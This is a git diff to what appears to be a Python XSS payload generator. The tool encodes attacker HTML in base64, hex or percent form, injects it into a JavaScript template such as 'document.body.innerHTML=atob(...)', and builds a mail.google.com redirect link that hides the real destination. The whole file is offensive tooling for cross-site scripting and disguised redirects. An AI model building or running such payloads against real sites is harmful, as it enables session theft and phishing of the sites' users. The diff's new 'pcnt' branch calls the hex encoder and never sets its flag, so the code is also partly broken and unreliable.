@@ -16,7 +16,7 @@ print (""" ___   __   __ _  ____
 
 
 def gmail_redirect(values):
-    print("https://mail.google.com/webhp#?uid=Z2l0aHViLmNvbS92bHA0NDM=&q=%s=&btnI=I" %  xssutils.url_encode_all_chars(values.get_dest()))
+    print("https://mail.google.com/webhp#?uid=Z2l0aHViLmNvbS92bHA0NDM=&q=%s=&btnI=I" % xssutils.pcnt_encode_all_chars(values.get_dest()))
 
 def encode_xss(values):
     html = values.get_html();
@@ -24,12 +24,17 @@ def encode_xss(values):
         html = xssutils.read_file(html[1:])
     html = xssutils.minify_html(html)
     html = apply_html_encoders(html, values)
-    js = values.get_js('%s')
-    # @todo: base64 and empty js what to do?
-    print(xssutils.url_encode_all_chars(js % html))
+    js = values.get_js('$-$')
+    js = js.split("$-$")
+    if(len(js) == 1):
+        js.append('')
+    js = list(map(lambda val: xssutils.pcnt_encode_all_chars(val), js))
+    merged = html.join(js)
+    print(merged)
 
 
 def apply_html_encoders(html, values):
+    pcnt_encoded = False
     encoders = values.get_encoders(False)
     if encoders is not False:
         for i in encoders.split(','):
@@ -37,14 +42,19 @@ def apply_html_encoders(html, values):
                 html = xssutils.base64_encode_string(html)
             elif i.lower()=='hex':
                 html = xssutils.js_hex_encode_all_chars(html)
+            elif i.lower()=='pcnt':
+                html = xssutils.js_hex_encode_all_chars(html)
+    # if we didnt percent encode apply normal url encoding so it doesnt break
+    if not pcnt_encoded:
+        html = xssutils.url_encode(html)
     return html
 
 
 argManager = parser.get_manager()\
     .add_value('--dest', metavar='Destination URL (for gmail)', nargs=1)\
     .add_value('--html', metavar='html to use, prefix with @ to make it a file e.g. --html @file.html', nargs=1)\
-    .add_value('--encoders', metavar="encoder/comma delimited list of encoders, each will be applied sequentially: supported b64, hex", nargs=1, )\
-    .add_value('--js', metavar="Javascript to inject html into (optional), use %s to show location to inject e.g. 'document.body.innerHTML=atob(\"%s\")", nargs=1)
+    .add_value('--encoders', metavar="encoder/comma delimited list of encoders, each will be applied sequentially: supported b64, hex, pcnt", nargs=1, )\
+    .add_value('--js', metavar="Javascript to inject html into (optional), use $-$ to show location to inject e.g. 'document.body.innerHTML=atob(\"$-$\")", nargs=1)
 
 argManager.add_action(argManager.print_help, '--help', help='Show this message', action='store_true')\
     .add_action(gmail_redirect, '--gmail', help='Redirect vial mail.google.com', action='store_true')\
